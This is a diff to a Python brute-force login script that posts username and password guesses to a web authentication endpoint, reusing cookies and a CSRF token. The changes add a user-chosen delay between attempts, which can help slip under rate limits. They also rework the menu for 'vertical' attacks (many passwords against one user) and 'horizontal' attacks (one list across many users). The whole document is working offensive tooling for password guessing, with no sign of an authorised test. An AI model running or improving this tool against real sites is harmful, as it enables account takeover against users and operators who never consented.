@@ -61,11 +61,6 @@ def attempt_login(session, username, password, csrf_token):
     # Perform the login request
     response = session.post(AUTH_URL, data=login_data, headers=headers, allow_redirects=False)
 
-    # Debugging: print the response status, headers, and part of the response body
-    # print(f"Response Status Code: {response.status_code}")
-    # print(f"Response Headers: {response.headers}")
-    # print(f"Response Body Snippet: {response.text[:500]}")  # First 500 characters of response body
-
     # Handle redirects
     if response.status_code == 302:
         print(f"Redirected to: {response.headers.get('Location')}")
@@ -77,8 +72,7 @@ def attempt_login(session, username, password, csrf_token):
 GREEN = "\033[32m"
 RESET = "\033[0m"  # Reset to default color
 
-
-def vertical_brute_force(single_username):
+def vertical_brute_force(single_username, sleep_time):
     """Perform vertical brute-force attack for a single user."""
     with requests.Session() as session:
         # Load cookie into the session
@@ -100,10 +94,9 @@ def vertical_brute_force(single_username):
             else:
                 print(f"[ERROR] Unexpected response for Password: {password}")
 
-            time.sleep(1)  # Sleep to prevent overwhelming the server
+            time.sleep(sleep_time)  # Customizable sleep time
 
-
-def horizontal_brute_force():
+def horizontal_brute_force(sleep_time):
     """Perform horizontal brute-force attack."""
     with requests.Session() as session:
         # Load cookie into the session
@@ -133,19 +126,25 @@ def horizontal_brute_force():
                 else:
                     print(f"[ERROR] Unexpected response for Username: {username}, Password: {password}")
 
-                time.sleep(1)  # Sleep to prevent overwhelming the server
+                time.sleep(sleep_time)  # Customizable sleep time
 
             print(f"Finished trying passwords for Username: {username}")
 
 
 # Choose the attack type
-print("Select attack type: \n1. Vertical (multiple users, single password list)\n2. Horizontal (single user, multiple passwords)")
+try:
+    sleep_time = float(input("Enter sleep time between requests (in seconds, e.g., 1.5): "))
+except ValueError:
+    print("Invalid input. Using default sleep time of 1 second.")
+    sleep_time = 1.0
+
+print("Select attack type: \n1. Vertical (multiple passwords, single user)\n2. Horizontal (single password, multiple users)")
 choice = input("Enter choice (1 or 2): ")
 
 if choice == "1":
-    vertical_brute_force()  # Calls vertical attack function
+    target_username = input("Enter the username for vertical brute-force: ")
+    vertical_brute_force(target_username, sleep_time)  # Calls vertical attack function
 elif choice == "2":
-    target_username = input("Enter the username for horizontal brute-force: ")
-    horizontal_brute_force(target_username)  # Calls horizontal attack function
+    horizontal_brute_force(sleep_time)  # Calls horizontal attack function
 else:
     print("Invalid choice.")
